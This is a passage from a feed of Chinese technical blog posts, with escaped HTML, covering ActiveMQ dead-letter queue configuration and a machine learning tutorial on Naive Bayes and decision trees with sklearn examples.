&lt;li&gt;核心业务队列：比如下图专门用来让订单系统发送订单消息的，然后另一个死信队列就是用来处理异常情况的。&lt;/li&gt;
&lt;li&gt;假如第三方物流系统故障了，此时无法请求，那么仓储系统每次消费到一条订单消息，尝试通知发货和配送都会遇到对方的接口报错。此时仓储系统就可以把这条消息拒绝访问或者标志位处理失败。一旦标志这条消息处理失败了之后，MQ就会把这条消息转入提前设置好的一个死信队列中。&lt;/li&gt;
&lt;li&gt;然后你会看到的就是，在第三方物流系统故障期间，所有订单消息全部处理失败，全部会转入死信队列。然后你的仓储系统得专门有一个后台线程，监控第三方物流系统是否正常，是否请求，不停的监视。一旦发现对方恢复正常，这个后台线程就从死信队列消费出来处理失败的订单，重新执行发货和配送的通知逻辑。&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118234828.png&quot; alt=&quot;image-20210118234828832&quot;/&gt;&lt;p&gt;&lt;strong&gt;死信队列的配置&lt;/strong&gt;（一般采用默认）&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;sharedDeadLetterStrategy
&lt;ul&gt;&lt;li&gt;不管是queue还是topic，失败的消息都放到这个队列中。下面修改activemq.xml的配置，可以达到修改队列的名字。&lt;/li&gt;
&lt;li&gt;将所有的DeadLetter保存在一个共享的队列中，这是ActiveMQ broker端默认的策略。共享队列默认为“ActiveMQ.QLQ”，可以通过&quot;deaLetterQueue&quot;属性来设定&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;deadLetterStrategy&amp;gt;
    &amp;lt;sharedDeadLetterStrategy deaLetterQueue=&quot;DLQ-QUEUE&quot;/&amp;gt;
&amp;lt;/deadLetterStrategy&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;individualDeadLetterStrategy&lt;/p&gt;
&lt;p&gt;可以为queue和topic单独指定两个死信队列。还可以为某个话题，单独指定一个死信队列。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210118235956.png&quot; alt=&quot;image-20210118235956137&quot;/&gt;&lt;p&gt;属性&quot;useQueueForTopicMessages&quot;，此值表示是否将Topic的DeaLetter保存在Queue中，默认为true&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210119000123.png&quot; alt=&quot;image-20210119000123044&quot;/&gt;&lt;ul&gt;&lt;li&gt;自动删除过期消息&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;过期消息是值生产者指定的过期时间，超过这个时间的消息&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210119000210.png&quot; alt=&quot;image-20210119000210743&quot;/&gt;&lt;ul&gt;&lt;li&gt;存放非持久消息到死信队列中&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210119000255.png&quot; alt=&quot;image-20210119000255042&quot;/&gt;&lt;h5 id=&quot;107-消息不被重复消费，幂等性问题&quot;&gt;10.7 消息不被重复消费，幂等性问题&lt;/h5&gt;
&lt;p&gt;之后回来完善&lt;/p&gt;
&lt;blockquote readability=&quot;1.5540540540541&quot;&gt;
&lt;p&gt;activemq的API文档：&lt;a href=&quot;http://activemq.apache.org/maven/apidocs/index.html&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/maven/apidocs/index.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 19 Jan 2021 14:41:00 +0000</pubDate>
<dc:creator>MPolaris</dc:creator>
<og:description>1. MQ理解 1.1 MQ的产品种类和对比 MQ即消息中间件。MQ是一种理念，ActiveMQ是MQ的落地产品。 消息中间件产品 各类MQ对比 Kafka 编程语言：Scala 大数据领域的主流MQ</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mpolaris/p/14295898.html</dc:identifier>
</item>
<item>
<title>机器学习4-分类算法2 - 清风紫雪</title>
<link>http://www.cnblogs.com/xiaofengzai/p/14300408.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaofengzai/p/14300408.html</guid>
<description>&lt;h2&gt;&lt;span&gt;朴素&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;假定特征与特征之间是相互独立的&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;3、-贝叶斯公式&quot;&gt;&lt;span&gt;贝叶斯公式&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119212113031-1658226704.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;公式分为三个部分：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;P(C)：每个文档类别的概率(某文档类别数／总文档数量)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;P(W│C)：给定类别下特征（被预测文档中出现的词）的概率P(F1,F2,…) 预测文档中每个词的概率&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;计算方法：P(F1│C)=Ni/N （训练文档中去计算）
&lt;ul&gt;&lt;li&gt;Ni为该F1词在C类别所有文档中出现的次数&lt;/li&gt;
&lt;li&gt;N为所属类别C下的文档所有词出现的次数和&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;如果计算两个类别概率比较：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119212210466-1704441939.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; 所以我们只要比较前面的大小就可以，得出谁的概率大&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;有的时候会出现为0的情况，而我们知道为0的情况不大可能出现，因此需要引进另一个参数，防止出现0&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;33-拉普拉斯平滑系数&quot;&gt;&lt;span&gt;拉普拉斯平滑系数&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;目的：防止计算出的分类概率为0&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119212459538-1133661975.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;34-api&quot;&gt;&lt;span&gt;API&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;sklearn.naive_bayes.MultinomialNB(alpha = 1.0)&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;朴素贝叶斯分类&lt;/li&gt;
&lt;li&gt;alpha：拉普拉斯平滑系数&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;span&gt;案例-新闻分类&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119212624224-2031009500.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;41-分析&quot;&gt;&lt;span&gt;分析&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.datasets &lt;span&gt;import&lt;/span&gt;&lt;span&gt; fetch_20newsgroups
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.model_selection &lt;span&gt;import&lt;/span&gt;&lt;span&gt; train_test_split
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.preprocessing &lt;span&gt;import&lt;/span&gt;&lt;span&gt; StandardScaler
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.neighbors &lt;span&gt;import&lt;/span&gt;&lt;span&gt; KNeighborsClassifier
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.model_selection &lt;span&gt;import&lt;/span&gt;&lt;span&gt; GridSearchCV
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.feature_extraction.text &lt;span&gt;import&lt;/span&gt;&lt;span&gt; TfidfVectorizer
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.naive_bayes &lt;span&gt;import&lt;/span&gt;&lt;span&gt;  MultinomialNB


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; nb_news():
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;获取数据集&lt;/span&gt;
    news=fetch_20newsgroups(subset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;all&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;划分数据集&lt;/span&gt;
    x_train,x_test,y_train,y_test=&lt;span&gt;train_test_split(news.data,news.target)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;文本特征抽取&lt;/span&gt;
    transfer=&lt;span&gt;TfidfVectorizer()
    x_train&lt;/span&gt;=&lt;span&gt;transfer.fit_transform(x_train)
    x_test&lt;/span&gt;=&lt;span&gt;transfer.transform(x_test)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;朴素贝叶斯&lt;/span&gt;
    estimator=&lt;span&gt;MultinomialNB()
    estimator.fit(x_train,y_train)

    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;模型评估&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方法1：直接比对真实值和预测值&lt;/span&gt;
    y_predict =&lt;span&gt; estimator.predict(x_test)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;y_predict:\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, y_predict)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;直接比对真实值和预测值:\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, y_test ==&lt;span&gt; y_predict)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方法2：计算准确率&lt;/span&gt;
    score =&lt;span&gt; estimator.score(x_test, y_test)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;准确率为：\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, score)



    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; None

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    nb_news()&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;结果为：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119212838027-325164504.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;5、总结&quot;&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;优点：&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;朴素贝叶斯模型发源于古典数学理论，有稳定的分类效率。&lt;/li&gt;
&lt;li&gt;对缺失数据不太敏感，算法也比较简单，常用于文本分类。&lt;/li&gt;
&lt;li&gt;分类准确度高，速度快&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;缺点：&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;由于使用了样本属性独立性的假设，所以如果特征属性有关联时其效果不好&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1、认识决策树&quot;&gt;&lt;span&gt;认识决策树&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119212942394-897108989.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;决策树分类原理详解&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213030085-1157439396.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;问题：如何对这些客户进行分类预测？你是如何去划分？&quot;&gt;&lt;span&gt;问题：如何对这些客户进行分类预测？你是如何去划分？&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;有可能你的划分是这样的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213056732-22055829.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 那么我们怎么知道这些特征哪个更好放在最上面，那么决策树的真是划分是这样的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213109942-1994329094.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;21-原理&quot;&gt;&lt;span&gt;原理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;信息熵，信息增益&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;221-信息熵的定义&quot;&gt;&lt;span&gt;信息熵的定义&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213216012-1168589174.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;222-总结（重要）&quot;&gt;&lt;span&gt;总结（重要）&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;信息和消除不确定性是相联系的&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;当我们得到的额外信息（球队历史比赛情况等等）越多的话，那么我们猜测的代价越小（猜测的不确定性减小）&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;问题：-回到我们前面的贷款案例，怎么去划分？可以利用当得知某个特征（比如是否有房子）之后，我们能够减少的不确定性大小。越大我们可以认为这个特征很重要。那怎么去衡量减少的不确定性大小呢？&quot;&gt;&lt;span&gt;问题： 回到我们前面的贷款案例，怎么去划分？可以利用当得知某个特征（比如是否有房子）之后，我们能够减少的不确定性大小。越大我们可以认为这个特征很重要。那怎么去衡量减少的不确定性大小呢？&lt;/span&gt;&lt;/h4&gt;
&lt;h3 id=&quot;23-决策树的划分依据之一信息增益&quot;&gt;&lt;span&gt;决策树的划分依据之一------信息增益&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;231-定义与公式&quot;&gt;&lt;span&gt;定义与公式&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;特征A对训练数据集D的信息增益g(D,A),定义为集合D的信息熵H(D)与特征A给定条件下D的信息条件熵H(D|A)之差，即公式为：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213422117-475167534.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 公式的详细解释：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213434204-2078153524.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;232-贷款特征重要计算&quot;&gt;&lt;span&gt;贷款特征重要计算&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;我们以年龄特征来计算：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1、g(D, 年龄) = H(D) -H(D|年龄) = 0.971-[5/15H(青年)+5/15H(中年)+5/&lt;span&gt;15H(老年]

&lt;/span&gt;2、H(D) = -(6/15log(6/15)+9/15log(9/15))=0.971

3、H(青年) = -(3/5log(3/5) +2/5log(2/5&lt;span&gt;))
H(中年)&lt;/span&gt;=-(3/5log(3/5) +2/5log(2/5&lt;span&gt;))
H(老年)&lt;/span&gt;=-(4/5og(4/5)+1/5log(1/5))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;我们以A1、A2、A3、A4代表年龄、有工作、有自己的房子和贷款情况。最终计算的结果g(D, A1) = 0.313, g(D, A2) = 0.324, g(D, A3) = 0.420,g(D, A4) = 0.363。所以我们选择A3 作为划分的第一个特征。这样我们就可以一棵树慢慢建立&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;25-决策树api&quot;&gt;&lt;span&gt;决策树API&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;class sklearn.tree.DecisionTreeClassifier(criterion=’gini’, max_depth=None,random_state=None)&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;决策树分类器&lt;/li&gt;
&lt;li&gt;criterion:默认是’gini’系数，也可以选择信息增益的熵’entropy’&lt;/li&gt;
&lt;li&gt;max_depth:树的深度大小&lt;/li&gt;
&lt;li&gt;random_state:随机数种子&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;其中会有些超参数：max_depth:树的深度大小&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;其它超参数我们会结合随机森林讲解&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;span&gt;案例&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;鸢尾花决策树分析&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.model_selection &lt;span&gt;import&lt;/span&gt;&lt;span&gt; train_test_split
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.datasets &lt;span&gt;import&lt;/span&gt;&lt;span&gt; load_iris
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; sklearn.tree &lt;span&gt;import&lt;/span&gt;&lt;span&gt; DecisionTreeClassifier,export_graphviz
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; pydotplus

&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; tree():
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    用决策树对鸢尾花分类
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt;获取数据集&lt;/span&gt;
    iris=&lt;span&gt;load_iris()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;划分数据集&lt;/span&gt;
    x_train,x_test,y_train,y_test=train_test_split(iris.data,iris.target,random_state=22&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;决策树预估器&lt;/span&gt;
    estimator=DecisionTreeClassifier(criterion=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;entropy&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    estimator.fit(x_train,y_train)

    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 模型评估&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方法1：直接比对真实值和预测值&lt;/span&gt;
    y_predict =&lt;span&gt; estimator.predict(x_test)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;y_predict:\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, y_predict)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;直接比对真实值和预测值:\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, y_test ==&lt;span&gt; y_predict)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方法2：计算准确率&lt;/span&gt;
    score =&lt;span&gt; estimator.score(x_test, y_test)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;准确率为：\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, score)

    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;可视化决策树&lt;/span&gt;
    dot_data=export_graphviz(estimator,out_file=None,feature_names=&lt;span&gt;iris.feature_names)
    graph &lt;/span&gt;=&lt;span&gt; pydotplus.graph_from_dot_data(dot_data)
    graph.write_pdf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;iris.pdf&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; None


&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    tree()&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;结果为：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119213924755-999957092.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 可视化展示：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119214055627-1874230468.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;3、案例：泰坦尼克号乘客生存预测&quot;&gt;&lt;span&gt;泰坦尼克号乘客生存预测&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;相关数据与说明：&lt;a href=&quot;https://www.kaggle.com/zephyrzhan522/titanic-prediction-dl-vs-ml&quot; target=&quot;_blank&quot;&gt;https://www.kaggle.com/zephyrzhan522/titanic-prediction-dl-vs-ml&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;31-分析&quot;&gt;&lt;span&gt;分析&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;选择我们认为重要的几个特征 ['pclass', 'age', 'sex']&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;填充缺失值&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;特征中出现类别符号，需要进行one-hot编码处理(DictVectorizer)数据集划分&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;x.to_dict(orient=&quot;records&quot;) 需要将数组特征转换成字典数据&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;决策树分类预测&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;&lt;span&gt;步骤&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;读取数据&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119214431565-935702681.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 抽取特征：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119214500035-1143544044.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 填充缺失值并转换为字典数据&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119214944034-951455443.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 数据集划分以及相关数据的转化&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119215057229-1976128040.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 决策树预估以及可视化&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119215133072-1012210427.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119215156443-1505808341.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 可视化展示：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1717524/202101/1717524-20210119215248870-844601552.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;4、-决策树总结&quot;&gt;&lt;span&gt;决策树总结&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;优点：&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;简单的理解和解释，树木可视化。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;缺点：&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;决策树学习者可以创建不能很好地推广数据的过于复杂的树，这被称为过拟合。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;改进：&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;减枝cart算法(决策树API当中已经实现，随机森林参数调优有相关介绍)&lt;/li&gt;
&lt;li&gt;随机森林&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;注：企业重要决策，由于决策树很好的分析能力，在决策过程应用较多， 可以选择特征&lt;/span&gt;&lt;/p&gt;

&lt;h2 id=&quot;1、-什么是集成学习方法&quot;&gt;&lt;span&gt;什么是集成学习方法&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;集成学习通过建立几个模型组合的来解决单一预测问题。它的工作原理是生成多个分类器/模型，各自独立地学习和作出预测。这些预测最后结合成组合预测，因此优于任何一个单分类的做出预测。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;2、-什么是随机森林&quot;&gt;&lt;span&gt;什么是随机森林&lt;/span&gt;&lt;/h2&gt;
